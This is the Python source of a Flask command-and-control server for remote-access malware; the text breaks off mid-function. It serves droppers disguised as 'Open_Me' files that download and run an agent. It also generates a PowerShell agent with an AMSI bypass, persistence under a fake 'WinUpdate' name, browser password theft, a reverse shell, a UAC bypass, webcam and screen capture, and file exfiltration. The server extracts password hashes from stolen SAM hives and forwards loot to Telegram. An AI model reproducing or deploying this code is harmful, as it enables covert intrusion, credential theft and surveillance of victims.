import os
import sys
import time
import uuid
import datetime
import sqlite3
import threading
import json
import re
import random
import string
import base64
import functools
import requests
from flask import Flask, request, jsonify, render_template, send_from_directory, session, redirect, url_for
from pyngrok import ngrok, conf

app = Flask(__name__, static_folder="static")

# --- Load Config ---
CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

DEFAULT_CONFIG = {
    "telegram_token": "",
    "telegram_chat_id": "",
    "admin_password": "admin",
    "flask_secret": "fallback-secret-key",
    "ngrok_token": ""
}

if not os.path.exists(CONFIG_PATH):
    with open(CONFIG_PATH, "w") as f:
        json.dump(DEFAULT_CONFIG, f, indent=4)

with open(CONFIG_PATH, "r") as f:
    config = json.load(f)

app.secret_key = config.get("flask_secret", "fallback-secret-key")
TELEGRAM_TOKEN = config.get("telegram_token")
TELEGRAM_CHAT_ID = config.get("telegram_chat_id")
ADMIN_PASSWORD = config.get("admin_password", "admin")

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import database
import reports

database.init_db()

SERVER_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(SERVER_DIR, "uploads", "screenshots")
EXFIL_FOLDER  = os.path.join(SERVER_DIR, "uploads", "exfiltrated")
os.makedirs(EXFIL_FOLDER,  exist_ok=True)

# VNC Frame Buffer

# --- Security ---
def login_required(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("index"))
        return render_template("login.html", error="Invalid password")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))

# ─── Helpers ──────────────────────────────────────────────────────────────────

def random_var(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def get_amsi_bypass():
    v = random_var()
    return (f"${v}=[Ref].Assembly.GetType('System.Management.Automation.'+'Am'+'siUtils');"
            f"${v}.GetField('am'+'siInitFailed','NonPublic,Static').SetValue($null,$true);")

def encode_powershell(cmd):
    return base64.b64encode(cmd.encode('utf-16-le')).decode()

def get_server_ip():
    if PUBLIC_C2_URL:
        # Return the hostname/IP from the public URL
        from urllib.parse import urlparse
        return urlparse(PUBLIC_C2_URL).hostname
    
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't even have to be reachable
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def get_server_url():
    """Returns the best available C2 URL."""
    if PUBLIC_C2_URL:
        return PUBLIC_C2_URL
    return f"http://{get_server_ip()}:5001"

def send_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"},
            timeout=10
        )
    except Exception as e:
        print(f"[!] Telegram error: {e}")

def send_telegram_photo(path, caption):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                files={"photo": f},
                data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
                timeout=30
            )
    except Exception as e:
        print(f"[!] Telegram photo error: {e}")

PUBLIC_C2_URL = None
NGROK_TUNNEL  = None

def set_ngrok_token(token):
    if token:
        conf.get_default().auth_token = token
        # Save to config file for persistence
        try:
            config["ngrok_token"] = token
            with open(CONFIG_PATH, "w") as f:
                json.dump(config, f, indent=4)
        except: pass

if config.get("ngrok_token"):
    set_ngrok_token(config["ngrok_token"])

send_telegram("☣️ *C2 Server Online* ☣️\nListening for agents on port 5001...")

# ─── Frontend ─────────────────────────────────────────────────────────────────

@app.after_request
def add_no_cache(response):
    """Prevent all caching so updates propagate immediately."""
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

@app.route("/")
@login_required
def index():
    return render_template("index.html")

# ─── Agent Registration / Beaconing ──────────────────────────────────────────

@app.route("/beacon", methods=["POST"])
@app.route("/api/p/agent", methods=["POST"])
@app.route("/api/v1/update", methods=["POST"])
@app.route("/static/js/main.js", methods=["POST"])
@app.route("/index", methods=["POST"])
def beacon():
    data = request.json or {}
    agent_id = data.get("agent_id")
    if not agent_id:
        return jsonify({"status": "error"}), 400

    hostname = data.get("hostname", agent_id)
    os_info  = data.get("os", "Unknown")
    is_sandbox = data.get("is_sandbox", False)
    is_new   = agent_id not in [a["id"] for a in database.get_agents()]

    database.register_agent({
        "id": agent_id, "hostname": hostname,
        "os": os_info, "username": data.get("username", "Unknown"),
        "ip": request.remote_addr,
        "is_sandbox": is_sandbox
    })
    database.update_checkin(agent_id)

    if is_new:
        send_telegram(
            f"✨ *New Agent!*\n"
            f"📍 Host: `{hostname}`\n"
            f"🆔 ID: `{agent_id}`\n"
            f"🌐 IP: `{request.remote_addr}`\n"
            f"💻 OS: `{os_info}`"
        )

    tasks = database.get_pending_tasks(agent_id)
    if tasks:
        task = tasks[0]
        return jsonify({"command": task["command"], "command_id": task["id"]})
    return jsonify({"status": "ok"})

@app.route("/result", methods=["POST"])
def result():
    data = request.json or {}
    if "command_id" not in data or "agent_id" not in data:
        return jsonify({"status": "error"}), 400

    database.add_result(data["command_id"], data["agent_id"], data.get("output", ""))
    
    # Auto-parse network scans
    output = data.get("output", "")
    if "ARP / NETWORK SCAN" in output:
        threading.Thread(target=parse_arp_scan, args=(data["agent_id"], output), daemon=True).start()

    # Auto-parse browser vault results
    if "=== [ BROWSER VAULT ] ===" in output:
        threading.Thread(target=parse_browser_vault, args=(data["agent_id"], output), daemon=True).start()
    
    # Auto-parse harvested files
    if "=== [ HARVESTED FILES ] ===" in output:
        threading.Thread(target=parse_harvest_results, args=(data["agent_id"], output), daemon=True).start()

    agent = next((a for a in database.get_agents() if a["id"] == data["agent_id"]), None)
    hostname = agent["hostname"] if agent else data["agent_id"]
    snippet  = str(data.get("output", ""))[:500]
    send_telegram(
        f"📋 *Result from `{hostname}`*\n"
        f"🆔 `{data['command_id']}`\n\n```\n{snippet}\n```"
    )
    return jsonify({"status": "success"})


# ─── File / Screenshot Upload ─────────────────────────────────────────────────

def parse_arp_scan(agent_id, output):
    """Parse raw arp -a output and save to hosts table."""
    import re
    # Look for IP and MAC patterns
    # Windows: 192.168.1.1           00-11-22-33-44-55     dynamic
    matches = re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+([a-fA-F0-9:-]{17})", output)
    for m in matches:
        ip, mac = m.groups()
        if not ip.endswith(".255") and not ip.startswith("224."):
            database.add_host(agent_id, ip, mac_addr=mac)

def parse_browser_vault(agent_id, output):
    """Parse decrypted browser credentials."""
    import re
    # Pattern: [Browser] URL | User | Pass
    matches = re.finditer(r"\[([^\]]+)\]\s+([^|]+)\s+\|\s+([^|]+)\s+\|\s+(.+)", output)
    for m in matches:
        browser, url, user, pwd = m.groups()
        database.add_browser_cred(agent_id, url.strip(), user.strip(), pwd.strip(), browser.strip())

def parse_harvest_results(agent_id, output):
    """Parse harvested file metadata."""
    import re
    # Pattern: [Category] Name (Size bytes) -> Path
    matches = re.finditer(r"\[([^\]]+)\]\s+([^\(]+)\s+\((\d+)\s+bytes\)\s+->\s+(.+)", output)
    for m in matches:
        cat, name, size, path = m.groups()
        database.add_harvested_file(agent_id, name.strip(), path.strip(), int(size), cat.strip())

@app.route("/api/p/report/screenshot", methods=["POST"])
def report_screenshot():
    agent_id = request.form.get("agent_id")
    if not agent_id or "file" not in request.files:
        return jsonify({"status": "error"}), 400
    f = request.files["file"]
    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{agent_id}_{ts}.png"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    f.save(filepath)
    database.add_result("SCREENSHOT", agent_id, f"Screenshot: {filename}")
    agent    = next((a for a in database.get_agents() if a["id"] == agent_id), None)
    hostname = agent["hostname"] if agent else agent_id
    send_telegram_photo(filepath, f"📸 Screenshot from {hostname}\n📅 {ts}")
    return jsonify({"status": "success", "filename": filename})

@app.route("/api/p/report/file", methods=["POST"])
def report_file():
    agent_id = request.form.get("agent_id")
    if not agent_id or "file" not in request.files:
        return jsonify({"status": "error"}), 400
    f        = request.files["file"]
    agent_dir = os.path.join(EXFIL_FOLDER, agent_id)
    os.makedirs(agent_dir, exist_ok=True)
    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{ts}_{f.filename}"
    filepath = os.path.join(agent_dir, filename)
    f.save(filepath)
    size     = os.path.getsize(filepath)
    database.add_result("EXFIL", agent_id, f"Exfiltrated: {f.filename} ({size} bytes)")
    agent    = next((a for a in database.get_agents() if a["id"] == agent_id), None)
    hostname = agent["hostname"] if agent else agent_id
    send_telegram(f"📂 *File from `{hostname}`*\n📄 `{f.filename}` ({size} bytes)")
    
    # Auto-process SAM hives if all 3 are present
    if f.filename.endswith(".hiv"):
        threading.Thread(target=process_sam_hives, args=(agent_id, agent_dir), daemon=True).start()

    return jsonify({"status": "success", "filename": filename})

def process_sam_hives(agent_id, folder_path):
    """Automatically extract hashes if SAM, SYSTEM, and SECURITY hives are found."""
    import subprocess
    import re

    # Find the most recent hives
    hives = {"sam": None, "system": None, "security": None}
    files = sorted(os.listdir(folder_path), reverse=True)
    
    for f in files:
        if not hives["sam"] and f.endswith("_s.hiv"): hives["sam"] = f
        if not hives["system"] and f.endswith("_y.hiv"): hives["system"] = f
        if not hives["security"] and f.endswith("_e.hiv"): hives["security"] = f

    if hives["sam"] and hives["system"] and hives["security"]:
        try:
            print(f"[*] Auto-extracting hashes for {agent_id}...")
            # Use absolute path to secretsdump if possible, or assume it's in PATH
            cmd = [
                "/Library/Frameworks/Python.framework/Versions/3.14/bin/python3",
                "/Library/Frameworks/Python.framework/Versions/3.14/bin/secretsdump.py",
                "-sam", os.path.join(folder_path, hives["sam"]),
                "-system", os.path.join(folder_path, hives["system"]),
                "-security", os.path.join(folder_path, hives["security"]),
                "LOCAL"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Parse NTLM hashes (Username:RID:LM:NTLM:::)
            # Example: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
            lines = result.stdout.splitlines()
            found_hashes = False
            for line in lines:
                match = re.match(r"^([^:]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::", line)
                if match:
                    user, rid, lm, nt = match.groups()
                    database.add_hash(agent_id, user, rid, nt)
                    found_hashes = True
            
            if found_hashes:
                send_telegram(f"🔑 *New Hashes Extracted* for `{agent_id}`\nCheck the dashboard for details.")
        except Exception as e:
            print(f"[X] Auto-secretsdump failed: {e}")


@app.route("/admin/vnc/stream/<agent_id>")
@login_required
def vnc_stream(agent_id):
    import time as _time
    def generate():
        last_frame = None
        while True:
            if frame and frame is not last_frame:
                last_frame = frame
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            _time.sleep(0.1)
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

# ─── Payload Delivery ─────────────────────────────────────────────────────────

@app.route("/api/p/agent")
def get_payload():
    try:
        path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "c2_agent_universal.py")
        with open(path, "r") as f:
            return f.read(), 200, {"Content-Type": "text/plain"}
    except Exception as e:
        return f"Error: {e}", 500

@app.route("/api/p/usb/win")
def get_usb_win():
    url = get_server_url()
    vbs = (
        f'Set o = CreateObject("MSXML2.XMLHTTP")\r\n'
        f'o.Open "GET", "{url}/api/p/agent", False\r\n'
        f'o.Send\r\n'
        f'p = Environ("TEMP") & "\\svc.py"\r\n'
        f'Set fs = CreateObject("Scripting.FileSystemObject")\r\n'
        f'Set f = fs.OpenTextFile(p, 2, True)\r\n'
        f'f.Write o.ResponseText\r\n'
        f'f.Close\r\n'
        f'CreateObject("WScript.Shell").Run "pythonw " & p, 0, False\r\n'
    )
    return vbs, 200, {"Content-Type": "text/vbscript", "Content-Disposition": "attachment; filename=Open_Me_Windows.vbs"}

@app.route("/api/p/usb/unix")
def get_usb_unix():
    url = get_server_url()
    sh  = f"#!/bin/bash\ncurl -s {url}/api/p/agent | nohup python3 - > /dev/null 2>&1 &\ndisown\n"
    return sh, 200, {"Content-Type": "text/x-shellscript", "Content-Disposition": "attachment; filename=Open_Me_Unix.sh"}

@app.route("/api/p/agent/ps")
def get_ps_agent():
    """Pure PowerShell agent - no Python required."""
    url   = get_server_url()
    amsi  = get_amsi_bypass()
    # Use plain variable names — no randomisation to avoid template conflicts
    ps = f"""{amsi}
$srv = "{url}"
$aid = [guid]::NewGuid().ToString().Substring(0,8)
$hst = [System.Net.Dns]::GetHostName()
$osn = "Windows (PS)"

while ($true) {{
    try {{
        $body = @{{ agent_id=$aid; hostname=$hst; os=$osn }} | ConvertTo-Json
        $resp = Invoke-RestMethod -Method Post -Uri "$srv/beacon" -Body $body -ContentType "application/json"
        if ($resp.command) {{
            $cmd = $resp.command.Trim()
            $tid = $resp.command_id
            $out = ""

            # Chaining support: Convert && to ; (supported in PS 7+ only natively, so we polyfill)
            $cmd = $cmd -replace ' && ', '; '

            $low = $cmd.ToLower()
            if ($low -eq "@persist") {{
                try {{
                    $fp = $PSCommandPath
                    if (!$fp) {{ $fp = "$env:TEMP\\agent.ps1"; [IO.File]::WriteAllText($fp,$MyInvocation.MyCommand.Definition) }}
                    Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WinUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $fp"
                    $out = "[+] Persistence installed."
                }} catch {{ $out = "[!] Persist failed: $($_.Exception.Message)" }}
            }} elseif ($low -eq "@screenshot") {{
                try {{
                    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                    $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bmp = New-Object System.Drawing.Bitmap $s.Width,$s.Height
                    $g = [System.Drawing.Graphics]::FromImage($bmp)
                    $g.CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size)
                    $tp = "$env:TEMP\\sc.png"
                    $bmp.Save($tp,[System.Drawing.Imaging.ImageFormat]::Png)
                    $g.Dispose(); $bmp.Dispose()
                    $wc = New-Object System.Net.WebClient
                    $wc.Headers.Add("agent_id",$aid)
                    [void]$wc.UploadFile("$srv/api/p/report/screenshot",$tp)
                    Remove-Item $tp -Force -ErrorAction SilentlyContinue
                    $out = "[+] Screenshot uploaded."
                }} catch {{ $out = "[!] Screenshot failed: $($_.Exception.Message)" }}
            }} elseif ($low.StartsWith("@ls")) {{
                $p = $cmd.Substring(3).Trim(); if (!$p) {{ $p = "." }}
                try {{ $out = Get-ChildItem $p | Format-Table Name,Length,LastWriteTime -AutoSize | Out-String }} catch {{ $out = $_.Exception.Message }}
            }} elseif ($low.StartsWith("@download")) {{
                $p = $cmd.Substring(9).Trim()
                try {{ (New-Object Net.WebClient).UploadFile("$srv/api/p/report/file",$p); $out = "[+] Exfil: $p" }} catch {{ $out = $_.Exception.Message }}
            }} elseif ($low -eq "@clipboard") {{
                try {{ $out = Get-Clipboard }} catch {{ $out = "[!] Clipboard error: $($_.Exception.Message)" }}
                if (!$out) {{ $out = "[!] Clipboard is empty." }}
            }} elseif ($low -eq "@creds") {{
                try {{
                    Add-Type -AssemblyName System.Security
                    $results = @()
                    $browsers = @{{
                        "Chrome" = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
                        "Edge"   = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
                    }}
                    foreach ($browser in $browsers.Keys) {{
                        $dbPath = $browsers[$browser]
                        if (!(Test-Path $dbPath)) {{ continue }}
                        $tmp = "$env:TEMP\\_${{browser}}_ld.db"
                        Copy-Item $dbPath $tmp -Force
                        try {{
                            $con = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                            $con.Open()
                            $cmd2 = $con.CreateCommand()
                            $cmd2.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                            $reader = $cmd2.ExecuteReader()
                            while ($reader.Read()) {{
                                $url  = $reader["origin_url"]
                                $user = $reader["username_value"]
                                $encPwd = $reader["password_value"]
                                if (!$user) {{ continue }}
                                try {{
                                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($encPwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                                    $pwd = [System.Text.Encoding]::UTF8.GetString($dec)
                                }} catch {{ $pwd = "[encrypted]" }}
                                $results += "$browser | $url | $user | $pwd"
                            }}
                            $con.Close()
                        }} catch {{ $results += "[!] $browser DB error: $($_.Exception.Message)" }}
                        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
                    }}
                    $out = if ($results.Count -gt 0) {{ $results -join "`n" }} else {{ "[!] No saved credentials found." }}
                }} catch {{ $out = "[!] Cred extraction failed: $($_.Exception.Message)" }}
            }} elseif ($low -eq "@webcam") {{
                try {{
                    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                    $vid = New-Object -ComObject WIA.DeviceManager
                    $dev = $vid.DeviceInfos | Where-Object {{ $_.Type -eq 2 -or $_.Type -eq 3 -or $_.Type -eq 1 }} | Select-Object -First 1
                    if ($dev) {{
                        $d  = $dev.Connect()
                        $it = $d.Items | Select-Object -First 1
                        $img = $it.Transfer()
                        $tp  = "$env:TEMP\\_wc.jpg"
                        $img.SaveFile($tp)
                        $wc = New-Object System.Net.WebClient
                        $wc.Headers.Add("agent_id",$aid)
                        [void]$wc.UploadFile("$srv/api/p/report/screenshot",$tp)
                        Remove-Item $tp -Force -ErrorAction SilentlyContinue
                        $out = "[+] Webcam captured (WIA) and uploaded to Gallery."
                    }} else {{ $out = "[!] No WIA webcam device found. Ensure webcam is connected and unlocked." }}
                }} catch {{ $out = "[!] Webcam error: $($_.Exception.Message)" }}
            }} elseif ($low -eq "@avcheck") {{
                try {{
                    $av  = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction Stop | Select-Object -ExpandProperty displayName) -join ", "
                    $def = (Get-MpComputerStatus -ErrorAction Stop | Select-Object AMServiceEnabled,RealTimeProtectionEnabled | Out-String).Trim()
                    $out = "AV: $av`n$def"
                }} catch {{ $out = "AV: Could not query (may need admin). Error: $($_.Exception.Message)" }}
            }} elseif ($low -eq "@privcheck") {{
                try {{
                    $privs  = whoami /priv | Out-String
                    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
                    $out = "[Admin: $(if($isAdmin){{'YES'}}else{{'NO'}})]`n$privs"
                }} catch {{ $out = $_.Exception.Message }}
            }} elseif ($low.StartsWith("@pingsweep")) {{
                try {{
                    $subnet = $cmd.Substring(10).Trim()
                    if (!$subnet.EndsWith(".")) {{ $subnet += "." }}
                    $live = @()
                    1..254 | ForEach-Object {{
                        $ip = "$subnet$_"
                        if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {{
                            $name = try {{ [System.Net.Dns]::GetHostEntry($ip).HostName }} catch {{ "" }}
                            $live += "$ip  $name"
                        }}
                    }}
                    $out = if ($live.Count -gt 0) {{ "[+] Live hosts ($($live.Count)):`n" + ($live -join "`n") }} else {{ "[!] No live hosts found on $subnet" }}
                }} catch {{ $out = $_.Exception.Message }}
            }} elseif ($low.StartsWith("@portscan")) {{
                try {{
                    $ip = $cmd.Substring(9).Trim()
                    $ports = @{{21="FTP";22="SSH";23="Telnet";25="SMTP";53="DNS";80="HTTP";135="RPC";139="NetBIOS";443="HTTPS";445="SMB";1433="MSSQL";3306="MySQL";3389="RDP";5432="PostgreSQL";5900="VNC";8080="HTTP-Alt"}}
                    $open = @()
                    foreach ($p in $ports.Keys) {{
                        $tcp = New-Object System.Net.Sockets.TcpClient
                        $con = $tcp.BeginConnect($ip,$p,$null,$null)
                        $wait = $con.AsyncWaitHandle.WaitOne(500,$false)
                        if ($wait -and !$tcp.Client.Connected -eq $false) {{ $open += "  $p/tcp  OPEN  $($ports[$p])" }}
                        $tcp.Close()
                    }}
                    $out = if ($open.Count -gt 0) {{ "[+] Open ports on $($ip):`n" + ($open -join "`n") }} else {{ "[!] No common ports open on $ip" }}
                }} catch {{ $out = $_.Exception.Message }}
            }} elseif ($low.StartsWith("@revshell")) {{
                $p = $cmd.Substring(9).Trim().Split(" ")
                if ($p.Length -lt 2) {{ $out = "[!] Usage: @revshell <ip> <port>" }}
                else {{
                    $ip=$p[0];$port=$p[1]
                    Start-Process powershell -WindowStyle Hidden -ArgumentList "-c `"`$c=New-Object System.Net.Sockets.TCPClient('$ip',$port);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{{0}};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){{`$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0,`$i);`$sb=(iex `$d 2>&1|Out-String);`$sy=([text.encoding]::ASCII).GetBytes(`$sb+'PS '+(pwd).Path+'> ');`$s.Write(`$sy,0,`$sy.Length);`$s.Flush()}};`$c.Close()`""
                    $out = "[+] Reverse shell initiated to $($ip):$port"
                }}
            }} elseif ($low -eq "@uacbypass") {{
                try {{
                    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
                    if ($isAdmin) {{ $out = "[+] Already running with Administrative privileges." }}
                    else {{
                        $path = "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
                        if (!(Test-Path $path)) {{ New-Item -Path $path -Force | Out-Null }}
                        $exec = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c `"iex(New-Object Net.WebClient).DownloadString('$srv/api/p/agent/ps')`""
                        Set-ItemProperty -Path $path -Name "(default)" -Value $exec -Force
                        Set-ItemProperty -Path $path -Name "DelegateExecute" -Value "" -Force
                        Start-Process fodhelper.exe
                        Start-Sleep -Seconds 5
                        Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force
                        $out = "[+] UAC Bypass (fodhelper) executed. New elevated session should arrive shortly."
                    }}
                }} catch {{ $out = "[!] UAC Bypass failed: $($_.Exception.Message)" }}
            }} elseif ($low -eq "@selfdestruct") {{
                $out = "[+] Self-destruct initiated."
                Invoke-RestMethod -Method Post -Uri "$srv/result" -Body (@{{agent_id=$aid;command_id=$tid;output=$out}}|ConvertTo-Json) -ContentType "application/json"
                Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WinUpdate" -ErrorAction SilentlyContinue
                $self = $PSCommandPath
                if ($self) {{ Start-Process cmd -ArgumentList "/c timeout /t 2 /nobreak >nul & del /f /q `"$self`"" -WindowStyle Hidden }}
                exit
            }} else {{
                # If command starts with @ but wasn't caught above, strip it to prevent splatting errors
                if ($cmd.StartsWith("@")) {{ $cmd = $cmd.Substring(1) }}
                try {{ $out = Invoke-Expression $cmd | Out-String }} catch {{ $out = $_.Exception.Message }}
            }}
            Invoke-RestMethod -Method Post -Uri "$srv/result" -Body (@{{agent_id=$aid;command_id=$tid;output=$out}}|ConvertTo-Json) -ContentType "application/json"
        }}
    }} catch {{ }}
    Start-Sleep -Seconds 5
}}
"""
    return ps, 200, {"Content-Type": "text/plain", "Content-Disposition": "attachment; filename=agent.ps1"}

# ─── Admin API ────────────────────────────────────────────────────────────────

@app.route("/admin/info")
@login_required
def server_info():
    ip = get_server_ip()
    url = get_server_url()
    return jsonify({
        "server_ip":  ip,
        "port":       5001,
        "local_url":  f"http://{ip}:5001",
        "is_global":  PUBLIC_C2_URL is not None,
        "full_url":   url
    })

@app.route("/admin/agents")
@login_required
def list_agents():
    return jsonify(database.get_agents())

@app.route("/admin/agents/<agent_id>", methods=["DELETE"])
@login_required
def remove_agent(agent_id):
    try:
        database.delete_agent(agent_id)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/admin/task", methods=["POST"])
@login_required
def add_task():
    data = request.json or {}
    if "agent_id" not in data or "command" not in data:
        return jsonify({"status": "error", "message": "Missing fields"}), 400
    task_id = database.add_task(data["agent_id"], data["command"])
    return jsonify({"status": "success", "task_id": task_id})

@app.route("/admin/results")
@login_required
def get_results():
    return jsonify(database.get_results(request.args.get("agent_id")))

@app.route("/admin/hashes")
@login_required
def get_hashes():
    return jsonify(database.get_hashes(request.args.get("agent_id")))

@app.route("/admin/network_map")
@login_required
def get_network_map():
    return jsonify(database.get_hosts(request.args.get("agent_id")))

@app.route("/admin/vault")
@login_required
def get_vault():
    return jsonify(database.get_browser_creds(request.args.get("agent_id")))

@app.route("/admin/vnc/latest")
@login_required
def get_vnc_latest():
    agent_id = request.args.get("agent_id")
    if not agent_id: return jsonify({"status": "error"}), 400
    
    # Use UPLOAD_FOLDER directly as it already includes 'screenshots'
    import glob
    files = glob.glob(os.path.join(UPLOAD_FOLDER, f"{agent_id}_*.png"))
    if not files: return jsonify({"status": "error", "message": "No screenshots found"}), 404
    
    latest_file = max(files, key=os.path.getctime)
    return jsonify({"status": "success", "url": f"/api/p/report/screenshot/view/{os.path.basename(latest_file)}"})

@app.route("/admin/harvested")
@login_required
def get_harvested():
    return jsonify(database.get_harvested_files(request.args.get("agent_id")))

@app.route("/admin/report/generate")
@login_required
def get_report():
    agent_id = request.args.get("agent_id")
    if not agent_id: return "Error: No Agent ID", 400
    report_text = reports.generate_full_report(agent_id, database.DB_PATH)
    return report_text, 200, {"Content-Type": "text/plain", "Content-Disposition": f"attachment; filename=report_{agent_id}.txt"}

@app.route("/api/p/report/audio/stream", methods=["POST"])
def report_audio_stream():
    agent_id = request.headers.get("agent_id")
    if not agent_id: return "Error", 400
    chunk = request.data
    # Save chunk to a continuous file
    stream_file = os.path.join(EXFIL_FOLDER, agent_id, "live_stream.wav")
    os.makedirs(os.path.dirname(stream_file), exist_ok=True)
    with open(stream_file, "ab") as f:
        f.write(chunk)
    return "OK", 200


@app.route("/admin/files/list", methods=["GET"])
@login_required
def list_files():
    agent_id = request.args.get("agent_id")
    path = request.args.get("path", ".")
    if not agent_id: return jsonify({"status": "error"}), 400
    task_id = database.add_task(agent_id, f"@ls {path}")
    return jsonify({"status": "success", "task_id": task_id})

@app.route("/admin/files/delete", methods=["POST"])
@login_required
def delete_file():
    data = request.json or {}
    agent_id = data.get("agent_id")
    path = data.get("path")
    if not agent_id or not path: return jsonify({"status": "error"}), 400
    task_id = database.add_task(agent_id, f"@del {path}")
    return jsonify({"status": "success", "task_id": task_id})

@app.route("/admin/screenshots")
@login_required
def list_screenshots():
    try:
        agent_id = request.args.get("agent_id")
        all_files = sorted([f for f in os.listdir(UPLOAD_FOLDER) if f.endswith(".png")], reverse=True)
        
        if agent_id:
            # Filter by agent ID prefix
            files = [f for f in all_files if f.startswith(agent_id)]
        else:
            # Return latest 50 if no agent selected
            files = all_files[:50]
            
        return jsonify({"status": "success", "screenshots": files})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/admin/screenshots/nuke", methods=["POST"])
@login_required
def nuke_screenshots():
    try:
        count = 0
        for f in os.listdir(UPLOAD_FOLDER):
            if f.endswith(".png"):
                os.remove(os.path.join(UPLOAD_FOLDER, f))
                count += 1
        return jsonify({"status": "success", "message": f"Successfully deleted {count} screenshots."})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/screenshots/<path:filename>")
@login_required
def get_screenshot(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route("/admin/screenshots/<path:filename>", methods=["DELETE"])
@login_required
def delete_screenshot(filename):
    try:
        filepath = os.path.join(UPLOAD_FOLDER, os.path.basename(filename))
        if os.path.exists(filepath):
            os.remove(filepath)
            return jsonify({"status": "success"})
        return jsonify({"status": "error", "message": "File not found"}), 404
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/admin/tunnel/start", methods=["POST"])
@login_required
def start_tunnel():
    global NGROK_TUNNEL, PUBLIC_C2_URL
    try:
        data = request.json or {}
        token = data.get("token")
        if token:
            set_ngrok_token(token)
        
        if not conf.get_default().auth_token:
            return jsonify({"status": "error", "message": "Ngrok Authtoken required. Get one at dashboard.ngrok.com"}), 400

        if NGROK_TUNNEL:
            ngrok.disconnect(NGROK_TUNNEL.public_url)
        
        NGROK_TUNNEL = ngrok.connect(5001, "http")
        PUBLIC_C2_URL = NGROK_TUNNEL.public_url
        
        send_telegram(f"🌐 *Public C2 Tunnel Online*\nURL: `{PUBLIC_C2_URL}`")
        return jsonify({"status": "success", "url": PUBLIC_C2_URL})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/admin/tunnel/stop", methods=["POST"])
@login_required
def stop_tunnel():
    global NGROK_TUNNEL, PUBLIC_C2_URL
    try:
        if NGROK_TUNNEL:
            ngrok.disconnect(NGROK_TUNNEL.public_url)
            NGROK_TUNNEL = None
        PUBLIC_C2_URL = None
        send_telegram("🛑 *Public C2 Tunnel Stopped*")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/admin/tunnel/status")
@login_required
def tunnel_status():
    return jsonify({
        "active": NGROK_TUNNEL is not None,
